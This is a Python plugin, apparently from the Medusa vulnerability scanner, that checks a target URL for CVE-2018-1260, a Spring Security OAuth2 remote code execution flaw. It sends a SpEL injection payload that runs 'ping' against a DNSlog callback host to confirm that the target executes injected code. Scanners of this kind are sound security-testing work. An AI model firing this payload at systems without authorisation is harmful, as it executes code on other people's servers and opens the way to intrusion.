#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Dnslog
import urllib3
import requests
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2018-1260" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-5-9"  # 插件编辑时间
        self.info['disclosure'] = '2018-5-7'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "SpringSecurityOauth2RemoteCodeExecution"  # 插件名称
        self.info['name'] ='SpringSecurityOauth2远程代码执行' #漏洞名称
        self.info['affects'] = "Spring"  # 漏洞组件
        self.info['desc_content'] = "此漏洞和CVE-2016-4977类似"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "SpringSecurityOAuth2.3-2.3.2\r\nSpringSecurityOAuth2.2-2.2.1\r\nSpringSecurityOAuth2.1-2.1.1\r\nSpringSecurityOAuth2.0-2.0.14"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Spring版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    try:

        DL=Dnslog()
        payload ="/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.github.com&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20{}%22%29%7D".format(DL.dns_host())
        payload_url = url + payload
        resp = requests.get(payload_url,headers=Headers, proxies=proxies, timeout=6, verify=False)
        time.sleep(4)
        if DL.result():
            Medusa = "{}存在SpringSecurityOauth2远程代码执行漏洞(CVE-2018-1260)\r\n验证数据:\r\n返回内容:{}\r\nDnsLog:{}\r\nDnsLog数据:{}\r\n".format(url,resp.text, DL.dns_host(), str( DL.dns_text()))
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

